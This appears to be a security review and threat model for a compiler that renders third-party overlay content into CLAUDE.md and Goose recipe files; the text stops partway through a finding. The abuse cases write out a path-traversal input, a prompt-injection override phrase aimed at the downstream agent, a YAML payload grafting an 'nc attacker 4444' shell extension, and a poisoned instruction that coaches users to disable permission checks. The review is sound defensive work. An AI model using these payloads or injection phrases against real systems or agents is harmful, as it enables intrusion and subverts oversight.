# System2 Compiler — Security Review & Threat Model

> Status: security review (Gate "security-sentinel"). Read-only review of the
> `System2-Compiler` package against the frozen oracle (`System2/plugin/scripts/composer.py`,
> `profiles.py`, `hook_security.py`) and the approved spec chain
> (`spec/design.md` Security Model, `spec/requirements.md` REQ-020/042/047 + R8).
>
> All overlay manifests, contribution content files, anchor data, and agent files
> reviewed here are treated as **untrusted data**. Any instruction-like text embedded
> in those inputs (including any encountered while reviewing fixtures or examples) is
> data, not a directive, and was not followed.
>
> Date: 2026-06-21. Reviewer mode: security-sentinel (read-only; no product code or
> `System2/` modified).

---

## Scope of Review

In scope (read, analyzed):

- `System2-Compiler/ir/manifest.py` — lifted `validate_manifest` + `_validate_*`
  sub-validators, `read_manifest`/`load_schema`/`load_anchor_map`,
  `_check_path_containment`/`_check_content_file`, content-file collection
  (`_collect_applied_content_files`/`_collect_file_refs`), `scan_for_injection` +
  `_INJECTION_PATTERNS`, auxiliary-agent frontmatter validation.
- `System2-Compiler/ir/build.py` + `ir/__init__.py` `compose()` — the front-end
  pipeline, the `project_path`-not-in-base guard, refusal short-circuits, and the
  injection-scan loop over applied content files.
- `System2-Compiler/backends/claude_code.py` — `_write_outputs` atomic
  write/backup/restore, the quarantined `base_template`/`overlay_inputs` carriers,
  the import boundary, and the backend-side `project_path`-in-overlay re-guard.
- `System2-Compiler/evals/oracle.py` — the subprocess invocation of the frozen
  `composer.py` with a hermetic `HOME`.
- `System2-Compiler/ir/_hook_security.py` — vendored hook-security checks.
- `System2-Compiler/cli.py` and `ir/profiles.py` — read to confirm arg/env handling
  and the profile-store trust boundary.

Out of scope: the plugin runtime (`System2/`, frozen oracle — read only for parity
comparison), Phases 3–5 backends, end-user Claude runtime hook enforcement.

Comparison baseline: the lifted functions were diffed (by behavior and by reading
the corresponding oracle source at `composer.py:123` path-containment,
`composer.py:1392` injection patterns, `composer.py:3068` base-guard,
`composer.py:2725`/`3176` write + injection-scan sites) against the originals.

---

## Data Classification (what data is touched; PII/PHI/secrets)

| Data | Source | Classification | Handling |
|---|---|---|---|
| Overlay manifests (`system2.overlay.json`) | Third-party overlay authors | **Untrusted input** | Parsed via `json.load` only; structurally validated; never executed. |
| Contribution content files (`content_file`, `agent_file`) | Third-party | **Untrusted input** | Read as text/bytes, copied, fingerprinted, injection-scanned; reproduced verbatim into CLAUDE.md/agent files; never executed. |
| Anchor map / overlay schema (`schemas/*.json`) | Plugin (installer-owned) | Trusted config | `json.load`; drives validation vocabulary. |
| Base CLAUDE.md template + `plugin.json`/`VERSION` | Plugin (installer-owned) | Trusted config | Read as text; carried as `base_template`. |
| Profile store (`~/.system2/profiles.json`) | Local user | User-controlled, semi-trusted | `json.load` + structural validation; resolves to overlay paths. |
| Emitted lock / degradation report / warnings | Compiler output | Derived metadata | Capability/status/identity + sha256 hashes only. |

PII/PHI: none expected in the data model. Secrets: the compiler emits **no**
secrets — the lock/degradation report/warnings carry only capability names,
statuses, mechanism strings, version strings, file paths, and sha256 digests.
There is one privacy nuance: emitted artifacts embed local **filesystem paths**
(see Findings F-04).

---

## Threat Model (assets, actors, attack surfaces)

### Trust boundaries

```
[Untrusted: overlay authors]        [Trusted: plugin install]      [Local user]
  manifests + content files            schema, anchor-map,           profiles.json
        |                              base CLAUDE.md, VERSION             |
        v                                     v                            v
  ====================== ir/ front-end (compose) =========================
   read_manifest -> validate_manifest (path containment, hook security)
   -> detect_conflicts -> _collect_applied_content_files -> scan_for_injection
   -> build_graph  ==>  System2Graph (neutral IR; untrusted text quarantined in
                        base_template / overlay_inputs carriers)
  ========================================================================
        |
        v
  ============ backends/claude_code.py emit(ir, project_path) =============
   render CLAUDE.md (verbatim text reproduction, no exec) -> _generate_lock
   -> atomic _write_outputs (backup/restore) into the *project* tree
  ========================================================================
        |
        v
   [Project filesystem]  CLAUDE.md, spec/overlay-manifest.lock,
                         .claude/agents/<aux>.md, .system2/overlays/<name>/
```

### Assets

- A1 — Integrity of the installed plugin/base directory (must never be written into).
- A2 — Integrity of the host filesystem outside the target project (no traversal/symlink escape).
- A3 — The user's real profile store `~/.system2/profiles.json` (golden suite must not touch it).
- A4 — The Claude agent's downstream behavior (must not be subverted by overlay-embedded prompt injection that is silently lowered into CLAUDE.md as authoritative instructions).
- A5 — Process integrity of the compiler (no arbitrary code execution from untrusted input).
- A6 — Pre-existing project files at write time (atomic write must not corrupt them on partial failure).

### Actors

- Benign overlay author (default).
- Malicious overlay author / supply-chain attacker who crafts a manifest + content files to (a) escape the overlay dir, (b) overwrite the plugin or other repos, (c) inject control text into CLAUDE.md, (d) smuggle an executable safety-hook collision, (e) crash/DoS the compiler.
- Local attacker with a poisoned `~/.system2/profiles.json`.
- The compiler/oracle code itself (must remain stdlib-only, no network).

### Attack surfaces

- Manifest JSON parsing and field-type validation.
- `content_file`/`agent_file`/`hooks[].command` path references (traversal, symlink, absolute).
- Untrusted text reproduced into CLAUDE.md, lock, and agent files.
- The oracle subprocess (`evals/oracle.py`) argument/env construction.
- Profile resolution reading a user-controlled store.

---

## Abuse Cases (realistic misuse scenarios)

- **AC-1 — Path traversal to overwrite host files.** A manifest sets
  `content_file: "../../../../etc/passwd"` (or `agent_file` / `hooks[].command`).
  *Defense:* `_check_path_containment` (`ir/manifest.py:95`) rejects `..` segments
  and absolute paths before any read/copy. Outcome: validation error, refusal.

- **AC-2 — Symlink escape.** The overlay ships a symlink `evil -> /etc` and
  references `content_file: "evil/passwd"`. *Defense:* `_check_path_containment`
  resolves with `os.path.realpath` and requires the resolved path to remain under
  `realpath(overlay_path)` (`ir/manifest.py:114-128`). Outcome: refusal.

- **AC-3 — Compose into the plugin/base dir to corrupt the install.** Attacker
  passes `--project <plugin dir>`. *Defense:* `compose()` guard
  (`ir/__init__.py:119-129`) refuses when `real_project == real_base` or is nested
  under it, **before** any emit. Backend adds a second guard against overlay source
  trees (`backends/claude_code.py:1095-1104`). Outcome: refusal.

- **AC-4 — Prompt injection lowered into CLAUDE.md.** A content file contains
  "ignore all previous instructions / you are now a …". *Defense:* the text is
  treated as data and reproduced verbatim (never executed); `scan_for_injection`
  (`ir/manifest.py:991`) raises a **warning** surfaced to stderr and the report.
  *Residual:* the scan is advisory pattern-matching only and does not block — see
  F-05 (informational; matches oracle).

- **AC-5 — Malicious overlay hook that exfiltrates / runs commands.** Overlay
  declares `hooks[].command` pointing at a script using `subprocess`/`socket`/
  `__import__`. *Defense:* `check_hook_security(..., overlay=True)`
  (`ir/_hook_security.py:416`) runs AST-based bans on subprocess/ctypes/multiprocessing,
  `os.system`/`os.popen`, dynamic import, and `exec`/`eval`, plus network-module
  detection; violations become validation errors. Overlay hooks may also not collide
  with base safety-hook filenames (`ir/manifest.py:634`). Outcome: refusal on
  violation. (Note: the compiler does not *execute* the hook; this prevents a
  malicious hook from being installed/wired.)

- **AC-6 — Safety-hook shadowing.** Overlay names a hook
  `dangerous-command-blocker.py` to displace a base safety hook. *Defense:*
  `_SAFETY_HOOK_FILENAMES` collision check (`ir/manifest.py:88, 634`) rejects it.

- **AC-7 — Poisoned profile store redirects overlays.** A tampered
  `~/.system2/profiles.json` points a profile at an attacker overlay dir.
  *Defense:* `_validate_store` (`ir/profiles.py:32`) structurally validates; the
  resolved overlays still pass full manifest validation + path containment. The
  store is user-owned (same trust as the invoking user), so this is the user's own
  trust boundary; resolution never executes store content.

- **AC-8 — DoS via duplicate IDs / cyclic `after` ordering / huge nesting.**
  *Defense:* duplicate-ID detection (`ir/manifest.py:362-372`), topological-sort
  cycle handling that skips the scope (`ir/build.py:179-184`), and recursive
  collectors over bounded JSON. Outcome: deterministic refusal/warn, no crash.
  *Residual:* deeply nested JSON could hit Python recursion limits in
  `_collect_file_refs`/`_collect_ids` — low severity, same as oracle (F-06).

- **AC-9 — Partial-write corruption of pre-existing project files.** A write
  fails mid-emit. *Defense:* `_write_outputs` backs up existing files/dirs and
  restores them on any exception, removing newly created paths
  (`backends/claude_code.py:691-976`). Outcome: prior state restored (REQ-044).

- **AC-10 — Golden suite clobbers the user's real `~/.system2`.** *Defense:*
  `evals/oracle.py` forces `HOME` to a per-run temp dir (`_hermetic_env`,
  `invoke_oracle`), so profile resolution never reads/writes the real store.

---

## Vulnerability Checklist

### Authn/Authz
Not applicable in the conventional sense — a single-shot, local, in-process CLI with
no users, sessions, services, or network (REQ-047). The only authorization-like
control is the **filesystem write boundary**: never write into the plugin/base
(AC-3) or an overlay source tree. Both are enforced (`ir/__init__.py:119`,
`backends/claude_code.py:1095`). Pass.

### Input validation and injection (incl. prompt injection)
- JSON only via `json.load`; no `yaml.load`, no `eval`/`exec`, no `pickle`/`marshal`
  of untrusted data. Confirmed by scan: zero `eval(`/`exec(`/`__import__`/`shell=True`
  in `ir/`, `backends/`, `cli.py` (the only hits are the AST-detector string
  literals inside `_hook_security.py` and docstrings).
- Structural type/enum/kebab/semver validation of every manifest field
  (`ir/manifest.py`), forbidden-tool checks on auxiliary agents
  (`_validate_auxiliary_agent_file`, `ir/manifest.py:805`).
- Path injection: containment check on all `content_file`/`agent_file`/hook command
  paths (AC-1/AC-2). Pass.
- Regex injection: overlay-supplied `hooks[].matcher` is compiled defensively in a
  `try/except re.error` (`ir/manifest.py:624-629`); a bad pattern is a validation
  error, not a crash. (`re.compile` of untrusted patterns has a theoretical ReDoS
  surface but the pattern is only compiled, never matched against attacker-scaled
  input here — low.)
- Prompt injection: untrusted content is reproduced as **data** into CLAUDE.md and
  agent files, never interpreted by the compiler; `scan_for_injection` raises
  advisory warnings (AC-4, F-05). Pass (parity with oracle).

### Secrets handling
The compiler reads no credentials and emits none. Lock/degradation report/warnings
contain only capability/status/mechanism/identity/version/hash/path metadata
(matches `spec/requirements.md` "Security & Privacy"). No secret material is logged.
Pass (with F-04 path-disclosure note).

### Logging/telemetry privacy
No telemetry, no network, no analytics (REQ-047; `_hook_security.check_no_network_calls`
governs the posture). Output is local files + stderr warnings only. The warning and
lock streams embed absolute source/project paths (F-04). Pass with note.

### Dependency risk
Stdlib-only across `ir/`, `backends/`, `cli.py`, `evals/` (REQ-016/043). Confirmed:
imports are limited to `os/re/json/hashlib/datetime/shutil/tempfile/ast/subprocess/
argparse/typing/dataclasses/pathlib`. No third-party package, no `pip install` on the
end-user path. Pass.

### Supply chain / build pipeline
- The compiler vendors `profiles.py` and `_hook_security.py` (copies of plugin
  modules) — a drift risk, mitigated by the Phase-0 oracle hash-pin that covers
  `composer.py` + `profiles.py` + `hook_security.py` (`evals/oracle.py:compute_lock`,
  `verify_pin` raises `DRIFT_MESSAGE` on mismatch, never auto-rebaselines per REQ-007).
  *Gap:* the pin covers the **oracle's** copies, not the compiler's **vendored**
  copies — see F-03.
- The oracle is invoked as a subprocess with an argument **list** (no `shell=True`),
  `cwd` pinned to the scripts dir, and a constrained env — no shell injection
  surface (AC-construction reviewed at `evals/oracle.py:146-169`). Pass.

---

## Findings

Severity scale: Critical / High (BLOCKER before ship) / Medium / Low / Informational.

### F-01 — Path containment, symlink, and base-dir guards preserved verbatim — PASS (no defect)
- **Severity:** Informational (positive finding).
- **Evidence:** `ir/manifest.py:95-130` is byte-for-behavior identical to the oracle
  `composer.py:123-158`; the `compose()` base guard `ir/__init__.py:119-129` matches
  `composer.py:3068-3083`. Absolute paths, `..` traversal (checked against both `/`
  and `os.sep`), and realpath-based symlink escape are all rejected before any read.
- **Remediation:** none. Maintain parity.

### F-02 — No dynamic execution of untrusted manifest/content text — PASS (no defect)
- **Severity:** Informational (positive finding).
- **Evidence:** Scan of `ir/`, `backends/`, `cli.py` shows no `eval`/`exec`/
  `__import__`/`importlib.import_module`/`os.system`/`os.popen`/`shell=True`/`pickle`/
  `marshal`/`yaml`. Untrusted content is parsed with `json.load` and reproduced as
  text only (`backends/claude_code.py:_render_contribution`, `_resolve_content_file`).
  Satisfies REQ-042 / R8.
- **Remediation:** none.

### F-03 — Vendored `profiles.py` / `_hook_security.py` are not hash-pinned against their plugin originals — MEDIUM
- **Severity:** Medium (supply-chain drift; not a runtime exploit).
- **Evidence:** `ir/profiles.py` and `ir/_hook_security.py` are hand-vendored copies
  of `System2/plugin/scripts/profiles.py` / `hook_security.py`. `evals/oracle.py`
  hash-pins the **oracle's** copies (`compute_lock` over `PROFILES_PATH`,
  `HOOK_SECURITY_PATH`) but nothing asserts the **vendored** copies still match. If
  the plugin tightens a hook-security ban (e.g., a new banned module) the compiler's
  vendored `_hook_security.py` could silently lag, weakening overlay-hook validation
  (AC-5) relative to the live plugin while goldens still pass (goldens exercise the
  oracle's own copy, not the vendored one).
- **Remediation (owner: executor):** add a test asserting the vendored
  `ir/_hook_security.py` and `ir/profiles.py` are byte-identical (or behavior-pinned)
  to the plugin originals, reusing the existing oracle hashes. Wire it into the same
  drift gate as REQ-007. Low effort, closes the only standing security-relevant drift
  gap. Not a ship blocker for Phases 0–2 (Claude posture unchanged), but should land
  before a second backend relies on the vendored validator.

### F-04 — Absolute filesystem paths disclosed in lock and stderr warnings — LOW
- **Severity:** Low (information disclosure; matches oracle).
- **Evidence:** The lock's per-overlay `source_path` (`backends/claude_code.py:1132-1139`),
  profile `source_paths` in the report (`ir/__init__.py:276-279`), and validation
  warnings embed absolute host paths. These land in a committed `spec/overlay-manifest.lock`.
- **Remediation:** accept (this is oracle-faithful behavior the byte-identity mandate
  requires this cycle; changing it would break REQ-014). Note for downstream consumers
  not to publish locks from sensitive paths. No executor action required for parity.

### F-05 — Injection scan is advisory (warn-only), not blocking — INFORMATIONAL
- **Severity:** Informational (by design; matches oracle and REQ-042).
- **Evidence:** `scan_for_injection` (`ir/manifest.py:991`) returns warnings;
  `compose()` collects them into `warnings.injection` and the report
  (`ir/__init__.py:236-238`) but never refuses. Pattern set is a fixed 10-entry list
  and is trivially evadable (paraphrase, encoding, non-English). It is a tripwire,
  not a control.
- **Remediation:** none for this cycle (preserving oracle behavior is required). The
  real defense is that the text is data, not executed (F-02), and that the live Claude
  runtime treats CLAUDE.md content within its own injection-resistant posture. Record
  as residual risk; revisit hardening when a second backend changes the trust model.

### F-06 — Unbounded recursion on adversarial JSON nesting — LOW
- **Severity:** Low (local DoS; self-inflicted; matches oracle).
- **Evidence:** `_collect_file_refs` / `_collect_ids` (`ir/manifest.py:948-969`) and
  `_conflict_report_to_dict` recurse over manifest structure; a pathologically nested
  manifest could exceed Python's recursion limit and raise `RecursionError`.
- **Remediation:** accept for this cycle (the compiler is run by the user on their own
  inputs; failure mode is a clean crash, not corruption). Optionally bound nesting
  depth if overlays become a remote/untrusted-fetch surface in a later phase.

### F-07 — Backend defense-in-depth re-guard correctly scoped — PASS (no defect)
- **Severity:** Informational (positive finding).
- **Evidence:** `ClaudeCodeBackend.emit` re-checks `project_path` against every
  overlay `source_path` via realpath prefix comparison
  (`backends/claude_code.py:1095-1104`) — a second layer beyond the front-end base
  guard, satisfying the REQ-020 defense-in-depth intent in `spec/design.md`.
- **Remediation:** none.

### F-08 — Backend import boundary holds (no untrusted-loader leak) — PASS (no defect)
- **Severity:** Informational (positive finding).
- **Evidence:** `backends/claude_code.py` imports only `from ir.graph import
  System2Graph` (+ stdlib); it does not import `ir/manifest.py`, `ir/anchors.py`,
  `ir/profiles.py`, `ir/capabilities.py`, `ir/_hook_security.py`, or any schema/
  anchor-map loader (REQ-015/040). The untrusted base/overlay text reaches the backend
  only through the quarantined `base_template`/`overlay_inputs` IR carriers and is
  reproduced verbatim, never executed (the `base_template` carrier is the design-T4
  seam, correctly named and isolated).
- **Remediation:** none. Keep the static module-boundary test enforcing this.

### F-09 — Oracle subprocess construction is injection-safe — PASS (no defect)
- **Severity:** Informational (positive finding).
- **Evidence:** `evals/oracle.py:146-169` builds `cmd` as a list passed to
  `subprocess.run(..., shell=False default)`; overlay paths are joined into a single
  `--overlays` argv element (not interpolated into a shell string); env is a minimal
  allowlist (`PATH/LANG/LC_*/TZ`) plus a forced hermetic `HOME`. No shell, no
  attacker-controlled env, no `os.system`. `HOME` override protects the user's real
  profile store (A3/AC-10).
- **Remediation:** none.

---

## Required Fixes Before Ship

**No Critical or High (BLOCKER) findings.** The lift did not introduce any
ship-blocking security regression. Required/recommended actions:

| ID | Severity | Required before ship? | Owner |
|---|---|---|---|
| F-03 | Medium | Recommended (not a hard blocker for Phases 0–2; required before a non-Claude backend relies on the vendored validator) | executor |
| F-04 | Low | No (parity-required; accept) | — |
| F-05 | Informational | No (by design) | — |
| F-06 | Low | No (accept) | — |

There is **no high/critical blocker** that must be fixed before shipping Phases 0–2.
F-03 is the single concrete executor action worth landing in this cycle.

---

## Defense-in-Depth Recommendations

- **DiD-1 (F-03):** add a drift test that pins the **vendored** `ir/_hook_security.py`
  / `ir/profiles.py` to the plugin originals, sharing the oracle hash machinery so a
  weakening of validation logic cannot pass silently.
- **DiD-2:** keep the static module-boundary test (F-08) and the
  no-`eval`/no-network/stdlib-only scans wired into CI as hard gates, so a future
  edit cannot reintroduce dynamic execution or a network dependency.
- **DiD-3:** add a focused unit test for `_check_path_containment` covering the three
  rejection arms (absolute, `..`, symlink-escape) and a same-dir accept, so the
  byte-identity goldens are not the *only* thing guarding the path boundary.
- **DiD-4:** consider normalizing/relativizing `source_path` in the lock (F-04) **only
  if/when** the byte-identity mandate is relaxed (OPEN-1); until then, document that
  locks may carry local paths.
- **DiD-5 (forward-looking):** when the injection scan (F-05) eventually informs a
  non-Claude backend whose runtime is *not* injection-resistant, promote the scan from
  advisory to a gating decision and structurally separate untrusted content with
  explicit data tags in that backend's representation.

---

## Residual Risk + Monitoring Plan

Residual risks accepted this cycle:

- **R-residual-1 (F-05):** advisory-only injection detection; mitigated by the
  no-execution invariant (F-02) and the live Claude runtime's own injection posture.
  Monitor via the warning stream captured in goldens (REQ-002/046).
- **R-residual-2 (F-04):** local path disclosure in committed locks; accepted for
  byte-identity. Monitor by documenting lock-handling guidance.
- **R-residual-3 (F-03 until fixed):** vendored-validator drift. Monitor via the
  oracle hash-pin (REQ-006/007) today; close with DiD-1.
- **R-residual-4 (F-06):** recursion-based local DoS on adversarial nesting; accepted.

Monitoring surfaces (all compile-time, no runtime telemetry per REQ-047):
1. Oracle hash-pin drift check (`evals/oracle.py verify_pin` → `DRIFT_MESSAGE`).
2. Byte-identical golden diffs across the matrix (catches any change to emitted
   CLAUDE.md/lock/agent/warning bytes, including injection-warning text).
3. Stdlib-only + no-network static scans over `ir/`/`backends/`.
4. Module-boundary static test (backend import isolation, F-08).
5. (Recommended) vendored-validator pin test (DiD-1).

---

## Verdict: did the lift preserve the oracle's security guarantees?

**Yes — the lift PRESERVED the frozen oracle's security properties; no guarantee was
weakened.** Specifically:

- **Path safety** (`_check_path_containment`, content-file checks): relocated
  verbatim and behavior-identical to `composer.py:123-172` — absolute, `..`, and
  symlink-escape rejection all intact (F-01).
- **Write-boundary invariant** (`project_path` not in/equal to base): preserved at
  `ir/__init__.py:119-129` identical to `composer.py:3068-3083`, **plus** a new
  backend-side re-guard against overlay source trees (F-07) — a strict
  *strengthening*, not a weakening.
- **No dynamic execution of untrusted input:** confirmed absent (F-02); the
  `base_template`/`overlay_inputs` carriers reproduce untrusted text verbatim and are
  never executed (F-08).
- **Injection scan** (`scan_for_injection` + patterns): relocated verbatim
  (`composer.py:1392-1419`), still warn-only and fired over the same anchor-filtered
  applied-content set (F-05) — behavior preserved.
- **Hook-security checks** (`_hook_security.py`): vendored faithfully; the AST bans on
  subprocess/dynamic-import/exec/eval/os.system/network and the safety-hook-collision
  check are intact (AC-5/AC-6).
- **Atomic write/restore:** `_write_outputs` backup/restore semantics preserved
  (REQ-044, AC-9).
- **Stdlib-only, no-network posture:** preserved (REQ-016/043/047).
- **Subprocess/env handling** in the new oracle harness is injection-safe and
  hermetic (F-09, AC-10).

The only net-new security-relevant gap is **organizational, not behavioral**: the
vendored validator copies lack their own drift pin (F-03, Medium). That is a
defense-in-depth hardening item, not a regression in the lifted behavior.

## Phase 3 — Goose Backend

### Scope of Review

The net-new Goose backend surface only:

- `System2-Compiler/backends/goose.py` — `GooseBackend.emit` and the artifact
  builders that render untrusted IR content (overlay-derived role/instruction prose,
  contribution metadata) into recipe YAML; the generated `run-system2.sh` launcher
  *text*; `goose/permission.yaml` (the adapted policy + `never_allow_commands`); the
  `system2.goose.lock.json` degradation report.
- `System2-Compiler/backends/_yaml.py` — the stdlib block-YAML serializer (the
  untrusted-string → YAML choke point; the injection question).
- The launcher's runtime behavior: ephemeral `XDG_CONFIG_HOME`, the copy of the
  user's `~/.config/goose/config.yaml` (provider API keys) into a `mktemp -d` dir,
  `goose run`, `trap cleanup EXIT`, `SYSTEM2_NO_PERMISSIONS` / `SYSTEM2_KEEP_CONFIG`.
- `System2-Compiler/cli.py` (the `--target goose` wiring).

Out of scope / unchanged: the front-end (`ir/*`), the Claude backend, the Phase 0–2
findings above. Phase 3 emits *no timestamps* and reads no `~/.config` at emit time
(confirmed: `goose.py` imports `os`/`shutil`/`tempfile` only for the `project_path`
write path; the only `$HOME`/`~/.config` reference is inside the generated launcher
*string*, executed later by the user, never by `emit`).

### Data Classification (Phase 3 delta)

- **Untrusted overlay content (UNTRUSTED-INPUT).** Role/instruction prose, gate
  checklist text, advisory-source `name`/`description`/`resolution`, spec section
  headings, auxiliary-agent roles, `write_scope`, `model_hint` — all overlay-author
  controlled, all rendered into recipe YAML. Must be treated as adversarial data, not
  control instructions.
- **Provider API keys / secrets (SECRET).** The user's `~/.config/goose/config.yaml`
  routinely contains provider API keys. The launcher *copies* this file into a temp
  dir at runtime. This is the only secret the Phase 3 surface touches. `emit` itself
  never reads it (the secret exposure is entirely in the generated launcher's runtime
  behavior).
- **No PII/PHI** is introduced by Phase 3 beyond whatever the user places in overlay
  prose (same posture as Phase 0–2).

### Threat Model (Phase 3)

**Assets.** (A1) The generated recipe set — its integrity governs what the downstream
Goose agent does; a recipe that silently gains an `extensions`/`sub_recipes`/tool
entry is RCE-adjacent (Goose extensions can be shell/MCP servers). (A2) The user's
provider API keys in the ephemeral config copy. (A3) Enforcement-honesty: the claim
that nothing is `native` (NFR-003).

**Actors.** (T1) A malicious or compromised overlay author (controls the untrusted IR
content). (T2) A co-tenant / local attacker on the host where the launcher runs
(targets the temp secret copy). (T3) A downstream Goose agent acting on a poisoned
recipe.

**Trust boundaries.**
1. **Untrusted overlay content → recipe YAML** (`_yaml.dump`). The serializer is the
   boundary: it must guarantee that no overlay string can escape its scalar/block
   context to inject a sibling/top-level YAML key (especially `extensions` or
   `sub_recipes`). Verdict below.
2. **User secret → ephemeral config** (launcher `cp $USER_CONFIG …`). The boundary is
   the temp dir's permissions + cleanup. Verdict below.
3. **Emit purity** — `emit` must not execute overlay content, must stay stdlib-only,
   and must not read `$HOME`. Confirmed clean.

### Abuse Cases (Phase 3)

1. **YAML key-injection via instruction prose.** A malicious overlay sets an advisory
   `description` to `ok\nextensions:\n- type: stdio\n  cmd: nc attacker 4444` aiming
   to graft a shell extension onto the recipe. *Tested:* the value lands inside the
   `instructions` `|` block literal; every line is indented ≥ the block indent, so the
   injected `extensions:` remains literal block text and is NOT a top-level key
   (`extensions` does not appear at the document root). Contained.
2. **Quoted-scalar breakout via `:` / `#` / flow chars.** Overlay `role.name` =
   `evil: injected` or `{evil: 1}` interpolated into `title`/`description`/`settings`.
   *Tested:* `_needs_quote` fires, the value is double-quoted via `json.dumps`, and the
   round-trip preserves it as a string. Contained.
3. **Doc-separator / directive injection** (`---`, `...`, `%TAG`) inside prose.
   *Tested:* inside a block literal these are indented literal text; as a scalar first
   char they trigger quoting. Contained.
4. **Co-tenant secret theft.** Attacker on a shared host reads the ephemeral
   `config.yaml` copy (provider keys) from `/tmp`. *Partly mitigated:* `mktemp -d`
   creates the parent `0700`; but the copied file is `0644` and survives a `SIGKILL`
   (F-G3/F-G4).
5. **False sense of enforcement.** A user believes `block-dangerous` hard-blocks
   `rm -rf /` on Goose. *Mitigated:* the lock's `DEGRADATION` string, the
   `enforced:false` flags, the advisory banners, and the launcher MODE/NOTICE lines
   all state "adapted != enforced". Honest (verdict below).
6. **Capability silent-drop.** An overlay introduces a capability the descriptor does
   not list, hoping it is dropped from the honesty report. *Mitigated:* `_ir_capabilities`
   raises on any IR capability missing from the descriptor (no silent drop).
7. **`SYSTEM2_NO_PERMISSIONS=1` social-engineering.** A poisoned recipe/instruction
   tells the user to set `SYSTEM2_NO_PERMISSIONS=1` to "fix" an approval prompt,
   disabling the adapted gate. *Mitigated only by* the LOUD `NOTICE:` block the launcher
   prints in that mode; residual (see Residual Risk).

### Vulnerability Checklist (Phase 3)

- **Authn/Authz.** N/A at emit time (local file generation). Runtime authz is the
  Goose permission policy — an *adapted* gate (`ask_before` + `smart_approve`), not a
  hard block, and honestly reported as such.
- **Input validation / injection (YAML).** The central vector. The serializer's
  conservative quoting (`_NEEDS_QUOTE_RE` + leading-char + reserved + numeric checks)
  contains `:`/`#`/`{}`/`[]`/`,`/`&`/`*`/`!`/`|`/`>`/`'`/`"`/`%`/`@`/`` ` `` in
  scalars, and the `|` block-literal indents every line so multi-line prose cannot
  inject a sibling key. **No reachable top-level key-injection found** (verdict A). Two
  latent serializer defects (F-G1, F-G2) do not currently reach a breakout because
  every emitted block's first line is a fixed, non-whitespace-prefixed string — but the
  safety rests on that undocumented invariant.
- **Prompt injection (agentic).** Overlay prose flows verbatim into recipe
  `instructions` that drive a Goose agent. This is the same accepted posture as the
  Claude backend (warn-only injection scan in the front-end; content is data the model
  reads). No new control/data confusion is introduced — the prose is never parsed back
  as System2 control. Untrusted content is *not* separated by structured tags inside
  the instruction block (carried as free prose), consistent with Phase 0–2; flagged as
  defense-in-depth, not a regression.
- **Secrets handling.** Provider keys are copied into a `0700` `mktemp -d` dir;
  `~/.config/goose` is never mutated; default path uses the ephemeral dir. Gaps: file
  mode `0644` (F-G3), no cleanup on `SIGKILL`/`SIGTERM` (F-G4), `SYSTEM2_KEEP_CONFIG=1`
  intentionally leaves the secret copy on disk (documented, noisy).
- **Logging/telemetry privacy.** The launcher prints NOTICE/MODE lines to stderr only
  (no secret values echoed — it announces "carried your config" without printing keys).
  `emit` logs nothing. Clean.
- **Dependency risk.** Stdlib-only (`json`, `os`, `re`, `shutil`, `tempfile`); no new
  third-party deps. Preserves the Phase 0–2 no-network posture.
- **Supply chain / build pipeline.** No build step added. The launcher shells out to
  `goose` (trusted, user-installed); `goose.json` is an in-repo data file. The runtime
  trusts the `goose` binary on `PATH` (same trust as any local CLI). No new
  pipeline-level exposure.

### Findings

- **F-G1 — Block-literal auto-indent mismatch on leading-whitespace first line
  (Medium, latent).** *Evidence:* `backends/_yaml.py:119-122` (`_block_literal`) pads
  every non-empty line by `(level+1)*indent` but emits no explicit indentation
  indicator on the `|` header (`goose.py:71,105,113` emit bare `|`). When a block
  scalar's first content line itself begins with whitespace, YAML auto-detects the
  block indent from that wider first line; a subsequent line at the nominal indent is
  then *less* indented and **ends the block early**. Repro: `_yaml.dump({'instructions':
  '  a\nb', 'x':'1'})` emits a document that PyYAML rejects with `expected <block end>,
  but found '<scalar>'`. *Reachability:* currently NONE — every emitted block's first
  line is a fixed prefix ("You are the System2 …"), so attacker content never occupies
  the first line. This is a latent correctness/robustness defect guarded only by an
  undocumented invariant. *Remediation:* emit an explicit indentation indicator
  (`|2`/`|2-`) or quote-and-escape instead of relying on auto-detect; add a serializer
  unit test for a leading-whitespace first line.
- **F-G2 — Unicode line separators (U+2028/U+2029/U+0085) not normalized
  (Low/Medium, latent).** *Evidence:* `_block_literal` splits only on `"\n"`
  (`_yaml.py:121`) and `_dump_scalar` uses `json.dumps`, which leaves U+2028/U+2029/NEL
  literal in the output. YAML 1.1 parsers (PyYAML) treat these as line breaks; YAML 1.2
  parsers (serde_yaml, which Goose uses) do not. Repro: `_yaml.dump({'title':'System2
  x y','k':'v'})` round-trips fine under serde_yaml but raises under PyYAML
  (`while scanning a simple key`). *Impact:* parser-divergence — a recipe that validates
  under Goose could be misread by any YAML-1.1 consumer of the same file; not a
  key-injection (the chars cannot create a key under serde_yaml). *Remediation:* strip
  or `\u`-escape U+2028/U+2029/U+0085 in both the scalar and block paths; document the
  YAML-1.2 target.
- **F-G3 — Ephemeral secret copy is world-readable file mode (Medium).** *Evidence:*
  `goose.py:543` (`cp "$USER_CONFIG" "$EPHEMERAL_CONFIG/goose/config.yaml"`). `cp`
  applies the user's umask, yielding `0644` on a default `umask 022`. The provider-key
  file's confidentiality then relies *solely* on the parent `mktemp -d` dir being
  `0700`. On hosts where `$TMPDIR` is a shared world-traversable `/tmp` and the dir mode
  is the only barrier, this is thinner than necessary. *Remediation:* `chmod 600` the
  copied `config.yaml` (and/or run the copy under a tightened `umask 077`) so the file
  is owner-only independent of the parent dir mode.
- **F-G4 — Secret copy not cleaned on signal / crash (Medium).** *Evidence:*
  `goose.py:539` uses `trap cleanup EXIT` only. `EXIT` fires on normal exit and on
  `set -e` failures, but NOT on `SIGKILL`, and shell `EXIT` handling of `SIGINT`/
  `SIGTERM` is not guaranteed without an explicit trap — so a Ctrl-C or OOM-kill can
  leave the plaintext-key `config.yaml` in `/tmp` until the next tmp-reap or reboot.
  *Remediation:* `trap cleanup EXIT INT TERM HUP` (and accept that `SIGKILL` is
  uncatchable — at minimum cover the catchable signals). *Note:* `SYSTEM2_KEEP_CONFIG=1`
  deliberately preserves the copy; that path is documented and prints a NOTICE — not a
  finding, but it widens the residual window when used.
- **F-G5 — `SYSTEM2_NO_PERMISSIONS=1` fully disables the adapted gate (Low,
  by-design).** *Evidence:* `goose.py:520-527` runs against the user's own config with
  no permission.yaml when the env var is set. This is the documented escape hatch and is
  guarded by a four-line LOUD `NOTICE:` block, but a poisoned instruction could coach a
  user into setting it. *Remediation (optional):* none required for ship; tracked under
